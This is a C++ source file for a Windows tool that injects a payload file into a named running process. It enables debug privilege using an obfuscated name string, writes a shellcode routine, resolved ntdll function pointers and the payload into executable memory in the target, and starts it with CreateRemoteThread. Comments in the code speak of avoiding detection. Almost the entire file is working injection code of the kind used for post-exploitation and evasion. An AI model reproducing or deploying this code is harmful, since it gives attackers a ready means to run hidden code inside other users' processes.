// InjectAssembly.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include "LHCommon.h"
#include "ExecuteAssembly.h"


BOOL InjectRometeDll(DWORD dwProcessId,LPCTSTR szFilePath, LPCTSTR szArg)
{
	BOOL   bResult = FALSE;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	HANDLE hFile = NULL;
	PSTR   pRemoteMemory = NULL;
	SIZE_T cch;
	__try
	{
		printf("dwProcessId:%08X\n", dwProcessId);
		// 获得想要注入代码的进程的句柄.  
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
		printf("OpenProcess:%p\n", hProcess);
		if (hProcess == NULL)
		{
			printf("[错误] OpenProcess(%d) 调用失败！错误代码: [%d]\n", dwProcessId, GetLastError());
			__leave;
		}

		HANDLE hFile = CreateFileW(szFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
		if (hFile == NULL)
		{
			printf("[错误] CreateFile(%ls) 调用失败！错误代码: [%d]\n", szFilePath, GetLastError());
			__leave;
		}
		DWORD FileSize = GetFileSize(hFile, NULL);
		intptr_t FunctionSize = GetFunctionSize(ExecuteAssembly);
		printf("FunctionSize:%lld [%ls] FileSize:%ld\n", FunctionSize, szFilePath, FileSize);
		if ((FileSize == 0)||(FileSize==-1))
		{
			printf("[错误] GetFileSize NULL 调用失败！错误代码: [%d]\n", GetLastError());
			__leave;
		}
		LPBYTE FileData = new BYTE[FileSize + 1];
		DWORD filetemp;
		if (ReadFile(hFile, FileData, FileSize, &filetemp, NULL)==0)
		{
			printf(("[错误] ReadFile:[%ld]%ls error:%d\n"), FileSize, szFilePath, GetLastError());
			__leave;
		}
		

		cch = FunctionSize + sizeof(PARAMX) + FileSize + 0x100;
		// 在远程线程中为路径名分配空间.  
		pRemoteMemory = (PSTR)VirtualAllocEx(hProcess, NULL, cch, MEM_COMMIT | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
		if (pRemoteMemory == NULL)
		{
			printf("[错误] VirtualAllocEx(%d) size:%lld 调用失败！错误代码: [%d]\n", dwProcessId,cch, GetLastError());
			__leave;
		}

		HMODULE NTDLL = GetModuleHandleA("ntdll");
		if (NTDLL == 0) __leave;
		PARAMX param;
		RtlZeroMemory(&param, sizeof(PARAMX));

		param.lpFileData = pRemoteMemory + FunctionSize + sizeof(PARAMX);
		param.DataLength = FileSize;
		wcscpy_s(param.szArgument,512, szArg);
		
		
		param.LdrGetProcedureAddress = (LdrGetProcedureAddressT)GetProcAddress(NTDLL, "LdrGetProcedureAddress");;
		param.NtAllocateVirtualMemory = (NtAllocateVirtualMemoryT)GetProcAddress(NTDLL, "NtAllocateVirtualMemory");
		param.LdrLoadDll = (LdrLoadDllT)GetProcAddress(NTDLL, "LdrLoadDll");
		param.RtlInitAnsiString = (RtlInitAnsiStringT)GetProcAddress(NTDLL, "RtlInitAnsiString");
		param.RtlFreeAnsiString = (RtlFreeAnsiStringT)GetProcAddress(NTDLL, "RtlFreeAnsiString");
		param.RtlAnsiStringToUnicodeString = (RtlAnsiStringToUnicodeStringT)GetProcAddress(NTDLL, "RtlAnsiStringToUnicodeString");
		param.RtlFreeUnicodeString = (RtlFreeUnicodeStringT)GetProcAddress(NTDLL, "RtlFreeUnicodeString");
		param.RtlInitUnicodeString = (RtlInitUnicodeStringT)GetProcAddress(NTDLL, "RtlInitUnicodeString");


		//写入shellcode
		if (!WriteProcessMemory(hProcess, pRemoteMemory, (PVOID)ExecuteAssembly, FunctionSize, &cch))
		{
			printf("[错误] WriteProcessMemory A (%d) 调用失败！错误代码: [%d]\n", dwProcessId, GetLastError());
			__leave;
		}
		if (!WriteProcessMemory(hProcess, pRemoteMemory + FunctionSize, (PVOID)&param, sizeof(PARAMX), &cch))
		{
			printf("[错误] WriteProcessMemory B (%d) 调用失败！错误代码: [%d]\n", dwProcessId, GetLastError());
			__leave;
		}
		if (!WriteProcessMemory(hProcess, pRemoteMemory + FunctionSize + sizeof(PARAMX), (PVOID)FileData, FileSize, &cch))
		{
			printf("[错误] WriteProcessMemory C (%d) 调用失败！错误代码: [%d]\n", dwProcessId, GetLastError());
			__leave;
		}

		// 创建远程线程，并通过远程线程调用用户的DLL文件.   
		hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)(pRemoteMemory), pRemoteMemory + FunctionSize, 0, NULL);
		if (hThread == NULL)
		{
			printf("[错误] CreateRemoteThread( %p ) 失败！错误代码: [%d]\n", pRemoteMemory + FileSize, GetLastError());
			__leave;
		}

		// 等待远程线程终止.  
		if (WAIT_FAILED == WaitForSingleObject(hThread, INFINITE))
		{
			printf("CreateRemoteThread() : WaitForSingleObject() 调用失败！错误代码: [%d]\n", GetLastError());
			__leave;
		}

		cch = FileSize + FunctionSize + sizeof(PARAMX) + 0x100;
		//清空DLL路径以免被侦测
		LPBYTE zBuffer = new BYTE[cch + 1];
		memset(zBuffer, 0, cch + 1);
		//WriteProcessMemory(hProcess, (PVOID)pRemoteMemory, (PVOID)zBuffer, cch, NULL);
		delete[] zBuffer;
		bResult = TRUE;
	}
	__finally
	{
		// 关闭句柄.   
		if (pRemoteMemory != NULL)
		{
			//VirtualFreeEx(hProcess, (PVOID)pRemoteMemory, 0, MEM_RELEASE);
		}
		if (hThread != NULL) CloseHandle(hThread);
		if (hProcess != NULL) CloseHandle(hProcess);
		if (hFile != NULL) CloseHandle(hFile);
	}
	return bResult;
}


DWORD EnablePrivilege(LPCTSTR name)
{
	BOOL rv;
	HANDLE hToken;

	TOKEN_PRIVILEGES priv = { 1,{0,0,SE_PRIVILEGE_ENABLED} };

	LookupPrivilegeValue(0, name, &priv.Privileges[0].Luid);

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);

	AdjustTokenPrivileges(hToken, FALSE, &priv, sizeof priv, 0, 0);

	rv = GetLastError();
	printf(("EnablePrivilege GetLastError:%d \n"), rv);

	CloseHandle(hToken);
	return rv;
}


#define PROCESSFLAG		20210822

int main(int argc, char* argv[])
{
	if (argc != 4)
	{
		printf("arg count error");
		return -1;
	}
	list<DWORD> ProcessList;
	wstring sProcessName;
	wstring sLibraryPath;
	wstring sLibraryArg;
	Utf8ToUnicode(argv[1], sProcessName);
	Utf8ToUnicode(argv[2], sLibraryPath);
	Utf8ToUnicode(argv[3], sLibraryArg);
	printf("3FindProcessName:%ls [%ls]\n", sProcessName.c_str(), sLibraryPath.c_str());
	//%08d
	const WCHAR szB08d[] = { 0x0025,0x0030,0x0038,0x0064,0x0000 };
	BYTE szTempBuff[0x100];

	printf("argv:%ls\n", sLibraryArg.c_str());
	const WCHAR szSE_DEBUG_NAME[] = { 0x0053,0x0065,0x0044,0x0065,0x0062,0x0075,0x0067,0x0050,0x0072,0x0069,0x0076,0x0069,0x006C,0x0065,0x0067,0x0065,0x0000 };
	EnablePrivilege(szSE_DEBUG_NAME);

	try
	{
		for (int i = 0; i < 60 * 4 * 5; i++)
		{
			ProcessList.clear();
			if (GetProcessIdByName(sProcessName.c_str(), ProcessList))
			{
				for (list<DWORD>::iterator it = ProcessList.begin(); it != ProcessList.end(); it++)
				{
					DWORD nProcessId = *it;

					printf("InjectRometeDll:%d\n", nProcessId);
					swprintf_s((wchar_t*)szTempBuff,128, szB08d, nProcessId ^ PROCESSFLAG);
					HANDLE m_hMutex = CreateMutex(NULL, TRUE, (wchar_t*)szTempBuff);
					int nError = GetLastError();
					if (nError == ERROR_ALREADY_EXISTS)
					{
						if (m_hMutex) CloseHandle(m_hMutex);
						return FALSE;
					}
					if (m_hMutex) CloseHandle(m_hMutex);
					if (!InjectRometeDll(nProcessId, sLibraryPath.c_str(), sLibraryArg.c_str()))
					{
						printf("注入失敗:%d\n", nProcessId);
					}
					Sleep(100);
					return 0;
				}
			}
			Sleep(200);
		}
	}
	catch (...)
	{

	}
}

// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单

// 入门使用技巧: 
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件
